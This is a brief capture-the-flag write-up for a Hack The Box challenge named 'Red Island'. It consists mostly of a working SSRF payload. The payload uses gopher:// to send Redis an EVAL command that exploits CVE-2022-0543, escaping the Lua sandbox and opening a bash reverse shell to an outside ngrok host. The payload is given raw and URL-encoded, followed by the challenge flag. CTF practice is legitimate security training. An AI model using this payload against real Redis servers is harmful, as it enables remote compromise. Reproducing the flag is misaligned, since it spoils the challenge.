# Red Island


# RCE
_From @d4rkmod3_

[CVE-2022-0543](https://www.adminxe.com/3620.html)

payload:
```
gopher://127.0.0.1:6379/_*3
$4
eval
$237
local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("bash -c 'bash -i >& /dev/tcp/6.tcp.ngrok.io/12355 0>&1'","r"); local res = f:read("*a"); f:close(); return res
$1
0
```

urlencode:
```
gopher://127.0.0.1:6379/_%2A3%0D%0A%244%0D%0Aeval%0D%0A%24237%0D%0Alocal%20io_l%20%3D%20package.loadlib%28%22%2Fusr%2Flib%2Fx86_64-linux-gnu%2Fliblua5.1.so.0%22%2C%20%22luaopen_io%22%29%3B%20local%20io%20%3D%20io_l%28%29%3B%20local%20f%20%3D%20io.popen%28%22bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F6.tcp.ngrok.io%2F12355%200%3E%261%27%22%2C%22r%22%29%3B%20local%20res%20%3D%20f%3Aread%28%22%2Aa%22%29%3B%20f%3Aclose%28%29%3B%20return%20res%0D%0A%241%0D%0A0
```


RCE và `cat /root/flag`

**HTB{r3d_righ7_h4nd_t0_th3_r3dis_land!}**